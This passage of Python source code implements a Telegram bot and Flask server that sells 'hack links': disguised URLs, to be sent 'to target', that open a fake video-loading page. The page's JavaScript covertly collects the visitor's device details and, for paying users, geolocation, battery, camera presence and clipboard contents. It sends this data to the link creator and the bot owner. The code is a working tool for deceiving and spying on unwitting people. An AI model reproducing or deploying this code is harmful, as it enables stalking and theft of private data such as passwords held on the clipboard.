        markup.add(types.InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_rad_{ad['id']}"))

        if ad['logo_file_id']:
            bot.send_photo(message.chat.id, ad['logo_file_id'], caption=text, reply_markup=markup)
        else:
            bot.send_message(message.chat.id, text, reply_markup=markup)

# ==================== OWNER ADS COMMANDS ====================
@bot.message_handler(commands=['createad'])
def create_ad_start(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command.")
        return
    msg = bot.reply_to(message, "📝 Send me the **button text** for the ad (e.g., 'Offers Click Now'):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, create_ad_button_text)

def create_ad_button_text(message):
    button_text = message.text.strip()
    msg = bot.reply_to(message, "🔗 Send me the **link** for the ad (e.g., https://example.com):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, create_ad_link, button_text)

def create_ad_link(message, button_text):
    link = message.text.strip()
    if not link.startswith(('http://', 'https://')):
        bot.reply_to(message, "❌ Invalid link. Must start with http:// or https://. Try again from /createad.")
        return
    msg = bot.reply_to(message, "🖼️ Send me a **photo** for the ad (optional, send /skip to skip):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, create_ad_photo, button_text, link)

def create_ad_photo(message, button_text, link):
    if message.text and message.text == "/skip":
        photo_file_id = None
    elif message.photo:
        photo_file_id = message.photo[-1].file_id
    else:
        bot.reply_to(message, "❌ Please send a photo or /skip. Try again from /createad.")
        return
    msg = bot.reply_to(message, "⏱️ Send me the **duration in minutes** for the ad (e.g., 60 for 1 hour):")
    bot.register_next_step_handler(msg, create_ad_duration, button_text, link, photo_file_id)

def create_ad_duration(message, button_text, link, photo_file_id):
    try:
        duration = int(message.text.strip())
        if duration <= 0:
            raise ValueError
    except:
        bot.reply_to(message, "❌ Invalid duration. Must be a positive number. Try again from /createad.")
        return

    created_at = datetime.datetime.now()
    expires_at = created_at + datetime.timedelta(minutes=duration)

    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO ads (button_text, link, photo_file_id, duration_minutes, created_at, expires_at, is_active)
                 VALUES (?, ?, ?, ?, ?, ?, 1)''',
              (button_text, link, photo_file_id, duration, created_at, expires_at))
    conn.commit()
    ad_id = c.lastrowid
    conn.close()

    bot.reply_to(message, f"✅ Ad created successfully!\nID: {ad_id}\nExpires at: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}")

@bot.message_handler(commands=['manageads'])
def manage_ads_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command.")
        return

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM ads ORDER BY created_at DESC")
    ads = c.fetchall()
    conn.close()

    if not ads:
        bot.send_message(message.chat.id, "📭 No ads found.")
        return

    for ad in ads:
        status = "🟢 Active" if ad['is_active'] else "🔴 Inactive"
        expiry = ad['expires_at'][:19] if ad['expires_at'] else "N/A"
        text = f"ID: {ad['id']}\nButton: {ad['button_text']}\nLink: {ad['link']}\nDuration: {ad['duration_minutes']} min\nExpires: {expiry}\nStatus: {status}\n👁️ Views: {ad['views']}"

        markup = types.InlineKeyboardMarkup(row_width=3)
        if ad['is_active']:
            markup.add(
                types.InlineKeyboardButton("⏱️ Extend", callback_data=f"ad_extend_{ad['id']}"),
                types.InlineKeyboardButton("⏹️ Stop", callback_data=f"ad_stop_{ad['id']}"),
                types.InlineKeyboardButton("🗑️ Delete", callback_data=f"ad_delete_{ad['id']}")
            )
        else:
            markup.add(
                types.InlineKeyboardButton("🗑️ Delete", callback_data=f"ad_delete_{ad['id']}")
            )

        if ad['photo_file_id']:
            bot.send_photo(message.chat.id, ad['photo_file_id'], caption=text, reply_markup=markup)
        else:
            bot.send_message(message.chat.id, text, reply_markup=markup)

    refresh_markup = types.InlineKeyboardMarkup()
    refresh_markup.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_ads"))
    bot.send_message(message.chat.id, "Use buttons above to manage ads. Click Refresh to update list.", reply_markup=refresh_markup)

def extend_ad(message, ad_id):
    try:
        minutes = int(message.text.strip())
        if minutes <= 0:
            raise ValueError
    except:
        bot.reply_to(message, "❌ Invalid duration. Please send a positive number.")
        return

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT expires_at FROM ads WHERE id=?", (ad_id,))
    row = c.fetchone()
    if not row:
        bot.reply_to(message, "❌ Ad not found.")
        conn.close()
        return

    current_expiry = datetime.datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S.%f')
    new_expiry = current_expiry + datetime.timedelta(minutes=minutes)
    c.execute("UPDATE ads SET expires_at=?, is_active=1 WHERE id=?", (new_expiry, ad_id))
    conn.commit()
    conn.close()

    bot.reply_to(message, f"✅ Ad #{ad_id} extended by {minutes} minutes. New expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}")

# ==================== HACK LINK COMMANDS ====================
@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
def gen_link(message):
    premium = is_premium(message.from_user.id)
    if premium:
        badge = "⭐ PREMIUM USER ⭐"
        features = "📸 Camera | 📍 Location | 📋 Clipboard | 📱 Phone"
    else:
        badge = "🆓 FREE USER 🆓"
        features = "🌐 IP | 📱 Device | 🖥️ Browser | 📺 Screen"
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🎯 ENTER VIDEO LINK", callback_data="enter_link")
    markup.add(btn)
    design_msg = f"""
╔══════════════════════╗
║   🔗 *LINK GENERATOR*   ║
╚══════════════════════╝

━━━━━━━━━━━━━━━━━━━━━
{badge}
━━━━━━━━━━━━━━━━━━━━━

✨ *Your Features:*
{features}

━━━━━━━━━━━━━━━━━━━━━
👇 *Click button below*
*and paste your video link*
━━━━━━━━━━━━━━━━━━━━━
    """
    bot.send_message(message.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)

    if not premium:
        ad = get_active_ad()
        if ad:
            markup_ad = types.InlineKeyboardMarkup()
            redirect_url = f"{BASE_URL}/ad_click/{ad['id']}"
            ad_button = types.InlineKeyboardButton(ad['button_text'], url=redirect_url)
            markup_ad.add(ad_button)
            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
            markup_ad.add(remove_ads)
            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup_ad)

@bot.callback_query_handler(func=lambda call: call.data == "enter_link")
def ask_link(call):
    bot.edit_message_text(
        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(call.message, process_link)

def process_link(message):
    url = message.text.strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        bot.reply_to(message, "❌ *Invalid Link!*\nMust start with http:// or https://", parse_mode="Markdown")
        return
    loading = bot.reply_to(message, "⏳ *Generating your secure link...*", parse_mode="Markdown")
    frames = [
        "🔴 *0%* [          ]",
        "🟠 *20%* [█         ]",
        "🟡 *40%* [██        ]",
        "🟢 *60%* [███       ]",
        "🔵 *80%* [████      ]",
        "💜 *99%* [█████     ]",
        "✨ *100%* [██████    ]"
    ]
    for frame in frames:
        time.sleep(0.4)
        try:
            bot.edit_message_text(frame, loading.chat.id, loading.message_id, parse_mode="Markdown")
        except:
            pass
    link_id = str(uuid.uuid4())[:8]
    modified_url = f"{BASE_URL}/click/{link_id}"
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
              (link_id, message.from_user.id, url, modified_url, datetime.datetime.now()))
    conn.commit()
    conn.close()
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}")
    btn2 = types.InlineKeyboardButton("🔍 PREVIEW", url=modified_url)
    btn3 = types.InlineKeyboardButton("📤 SHARE", switch_inline_query=modified_url)
    markup.add(btn1, btn2, btn3)
    success_msg = f"""
╔══════════════════════╗
║  ✅ *LINK GENERATED*   ║
╚══════════════════════╝

━━━━━━━━━━━━━━━━━━━━━
🔗 *Your Tracking Link:*
`{modified_url}`

━━━━━━━━━━━━━━━━━━━━━
📊 *Features Active:*
• Real-time tracking
• IP Geolocation
• Device Detection
• Browser Info
━━━━━━━━━━━━━━━━━━━━━

👇 *Send this link to target*
    """
    bot.edit_message_text(success_msg, loading.chat.id, loading.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
def copy_link(call):
    link_id = call.data.replace('copy_', '')
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,))
    row = c.fetchone()
    conn.close()
    if row:
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard!")
        bot.send_message(call.message.chat.id, f"📋 *Your Link:*\n`{row[0]}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "❌ Link not found")

# ==================== BALANCE ====================
@bot.message_handler(func=lambda m: m.text == "💰 BALANCE")
def balance_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (message.from_user.id,))
    user = c.fetchone()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (message.from_user.id,))
    coin = c.fetchone()
    recoin = coin[0] if coin else 0
    conn.close()

    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, f"👑 *OWNER*\n✨ Permanent Premium\n💰 ReCOIN : {recoin}", parse_mode="Markdown")
        return

    premium = is_premium(message.from_user.id)
    if premium:
        end = user[1][:10] if user and user[1] else "Unknown"
        bot.send_message(message.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n💰 ReCOIN : {recoin}\n✨ Features: Full (11-21)", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, f"🆓 *FREE USER*\n💰 ReCOIN : {recoin}\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")

# ==================== BOT INFO ====================
@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or m.text == "/bot_info")
def info_cmd(message):
    info_text = """
🤖 *BOT INFORMATION*

🔹 *FREE PLAN (Features 1-10)*
1. IPv4 Address
2. Battery Percentage
3. Network Type
4. Device Info
5. Platform
6. App Version
7. User Agent
8. Screen Resolution
9. Language & Timezone
10. Basic Permissions

💎 *PREMIUM PLAN (Features 11-21)*
11. IPv6 Address
12. Front Camera Snapshot
13. Back Camera Snapshot
14. Device Memory
15. Port Number
16. Bluetooth Info
17. XR (VR/AR) Info
18. Complete Location
19. Clipboard Data
20. 📱 Phone Number
21. Extended Device Info

⭐ *Premium Price (Stars):*
• 7 Stars – 30 Days
• 4 Stars – 15 Days
• 1 Star – 1 Day

🪙 *Premium Price (ReCOIN):*
• 2 ReCOIN – 1 Day
• 14 ReCOIN – 7 Days
• 30 ReCOIN – 15 Days
• 60 ReCOIN – 30 Days
"""
    bot.send_message(message.chat.id, info_text, parse_mode="Markdown")

# ==================== SUBSCRIPTION ====================
@bot.message_handler(commands=['subscription'])
@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION")
def subscription_cmd(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30"),
        types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15"),
        types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1"),
        types.InlineKeyboardButton("🪙 2 ReCOIN – 1 Day", callback_data="recoin_1"),
        types.InlineKeyboardButton("🪙 14 ReCOIN – 7 Days", callback_data="recoin_7"),
        types.InlineKeyboardButton("🪙 30 ReCOIN – 15 Days", callback_data="recoin_15"),
        types.InlineKeyboardButton("🪙 60 ReCOIN – 30 Days", callback_data="recoin_30")
    )
    bot.send_message(message.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration (Stars or ReCOIN):", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def pay_callback(call):
    days = 30 if call.data == "pay_30" else 15 if call.data == "pay_15" else 1
    stars = 7 if days == 30 else 4 if days == 15 else 1
    try:
        bot.send_invoice(
            call.message.chat.id,
            title=f"Premium {days} Days",
            description=f"{days} days premium access (features 11-21)",
            invoice_payload=f"premium_{days}",
            provider_token="",
            currency="XTR",
            prices=[types.LabeledPrice(label="Premium", amount=stars)]
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error: {e}")

def recoin_purchase(call):
    days = int(call.data.split('_')[1])
    recoin_needed = days * 2  # 1 day = 2 ReCOIN

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (call.from_user.id,))
    row = c.fetchone()
    if not row or row[0] < recoin_needed:
        bot.answer_callback_query(call.id, f"❌ Insufficient ReCOIN! You need {recoin_needed} ReCOIN.")
        conn.close()
        return

    new_balance = row[0] - recoin_needed
    c.execute("UPDATE user_coins SET recoin=? WHERE user_id=?", (new_balance, call.from_user.id))

    end_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", (end_date, call.from_user.id))
    conn.commit()
    conn.close()

    bot.answer_callback_query(call.id, f"✅ Premium activated for {days} days!")
    bot.send_message(call.message.chat.id, f"🎉 *Premium Activated!*\nValid for {days} days.\nRemaining ReCOIN: {new_balance}", parse_mode="Markdown")

@bot.pre_checkout_query_handler(func=lambda q: True)
def pre_checkout(q):
    bot.answer_pre_checkout_query(q.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def payment_success(message):
    payload = message.successful_payment.invoice_payload
    days = int(payload.split('_')[1])
    end_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", (end_date, message.from_user.id))
    conn.commit()
    conn.close()
    stars = message.successful_payment.total_amount // 100
    bot.send_message(OWNER_ID, f"💰 New premium: {message.from_user.id}\nStars: {stars}\nDays: {days}")
    bot.send_message(message.chat.id, f"✅ Premium activated for {days} days! Thank you.", parse_mode="Markdown")

# ==================== LOG HISTORY ====================
@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history")
def history_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT l.link_id, l.original_url, l.created_at, COUNT(c.id) as clicks
                 FROM links l LEFT JOIN clicks c ON l.link_id = c.link_id
                 WHERE l.user_id = ? GROUP BY l.link_id ORDER BY l.created_at DESC LIMIT 5''',
              (message.from_user.id,))
    rows = c.fetchall()
    conn.close()
    if not rows:
        bot.send_message(message.chat.id, "📭 No history found.")
        return
    text = "📊 *YOUR RECENT LINKS*\n\n"
    for r in rows:
        short_url = r[1][:40] + "..." if len(r[1]) > 40 else r[1]
        text += f"🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n\n"
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

# ==================== PERMISSION HANDLERS ====================
@bot.message_handler(content_types=['location'])
def handle_location(message):
    lat = message.location.latitude
    lon = message.location.longitude
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET location=? WHERE user_id=?", (f"{lat},{lon}", message.from_user.id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, username, location) VALUES (?, ?, ?)",
                  (message.from_user.id, message.from_user.username, f"{lat},{lon}"))
    conn.commit()
    conn.close()
    bot.send_message(OWNER_ID, f"📍 Location from {message.from_user.id}: {lat},{lon}")
    bot.reply_to(message, "✅ Location received! Thank you.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    phone = message.contact.phone_number
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, message.from_user.id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, username, phone) VALUES (?, ?, ?)",
                  (message.from_user.id, message.from_user.username, phone))
    conn.commit()
    conn.close()
    bot.send_message(OWNER_ID, f"📞 Phone from {message.from_user.id}: {phone}")
    bot.reply_to(message, "✅ Phone number received! Thank you.")

# ==================== TRACKING HTML ====================
TRACKING_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Loading video...</title>
    <style>
        body { background: #0f172a; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 8px solid #334155; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>🎥 Preparing your video...</h2>
    <div class="loader"></div>
    <p>Redirecting in <span id="countdown">3</span> seconds</p>
    <script>
        (async function() {
            const data = {};
            data.screen = screen.width + 'x' + screen.height;
            data.language = navigator.language;
            data.platform = navigator.platform;
            data.userAgent = navigator.userAgent;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isPremium = {{is_premium}};
            if (isPremium) {
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = battery.level * 100 + '%';
                    } catch(e) {}
                }
                if (navigator.geolocation) {
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                        });
                        data.location = pos.coords.latitude + ',' + pos.coords.longitude;
                    } catch(e) {}
                }
                if (navigator.mediaDevices) {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        data.camera = devices.some(d => d.kind === 'videoinput') ? 'available' : 'none';
                    } catch(e) {}
                }
                if (navigator.clipboard && navigator.clipboard.readText) {
                    try {
                        data.clipboard = await navigator.clipboard.readText();
                    } catch(e) {}
                }
            }
            fetch('/collect/{{link_id}}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.log(err));
            let sec = 3;
            const timer = setInterval(() => {
                sec--;
                document.getElementById('countdown').innerText = sec;
                if (sec <= 0) {
                    clearInterval(timer);
                    window.location.href = "{{original_url}}";
                }
            }, 1000);
        })();
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
@app.route('/')
def home():
    return "✅ Bot is running on Render!"

@app.route('/click/<link_id>')
def click_track(link_id):
    try:
        ip = request.remote_addr
        ua = request.user_agent.string
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT original_url, user_id FROM links WHERE link_id=?", (link_id,))
        row = c.fetchone()
        if not row:
            conn.close()
            return "Link not found", 404
        original_url = row[0]
        user_id = row[1]
        owner_premium = is_premium(user_id)
        c.execute("INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
                  (link_id, ip, ua, datetime.datetime.now()))
        c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
        conn.commit()
        conn.close()
        try:
            bot.send_message(OWNER_ID, f"📊 New click on {link_id}\nIP: {ip}")
        except:
            pass
        html = TRACKING_HTML.replace("{{link_id}}", link_id).replace("{{original_url}}", original_url).replace("{{is_premium}}", "true" if owner_premium else "false")
        return render_template_string(html)
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    try:
        data = request.json
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
        link_row = c.fetchone()
        if not link_row:
            conn.close()
            return json.dumps({"status": "error"}), 404
        user_id = link_row[0]
        ip = request.remote_addr
        c.execute('''UPDATE clicks SET screen=?, language=?, platform=?, timezone=?,
                     battery=?, location=?, camera=?, clipboard=?
                     WHERE link_id=? AND ip=? AND timestamp=(SELECT MAX(timestamp) FROM clicks WHERE link_id=? AND ip=?)''',
                  (data.get('screen'), data.get('language'), data.get('platform'),
                   data.get('timezone'), data.get('battery'), data.get('location'),
                   data.get('camera'), data.get('clipboard'),
                   link_id, ip, link_id, ip))
        conn.commit()
        if is_premium(user_id):
            msg = f"📥 *New Visitor Data*\nIP: {ip}\n"
            for key, value in data.items():
                if value:
                    msg += f"{key}: {value}\n"
            try:
                bot.send_message(user_id, msg, parse_mode="Markdown")
            except:
                pass
        owner_msg = f"🔔 *New Data*\nLink: {link_id}\nUser1: {user_id}\nIP: {ip}\nData: {json.dumps(data)}"
        bot.send_message(OWNER_ID, owner_msg, parse_mode="Markdown")
        conn.close()
        return json.dumps({"status": "ok"})
    except Exception as e:
        print("Error in /collect:", e)
        return json.dumps({"status": "error"}), 500

@app.route('/ad_click/<int:ad_id>')
def ad_click(ad_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT link FROM ads WHERE id=?", (ad_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE ads SET views = views + 1 WHERE id=?", (ad_id,))
            conn.commit()
            conn.close()
            return redirect(row[0])
        else:
            conn.close()
            return "Ad not found", 404
    except Exception as e:
        return f"Error: {e}", 500

# ==================== WEBHOOK SETUP ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return 'OK', 200

# ==================== START BOT WITH WEBHOOK ====================
def run_bot():
    init_db()
    print("🤖 Bot starting with webhook...")
    bot.remove_webhook()
    webhook_url = f"{BASE_URL}/webhook"
    result = bot.set_webhook(url=webhook_url)
    if result:
        print(f"✅ Webhook set to {webhook_url}")
    else:
        print("❌ Webhook failed to set")

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
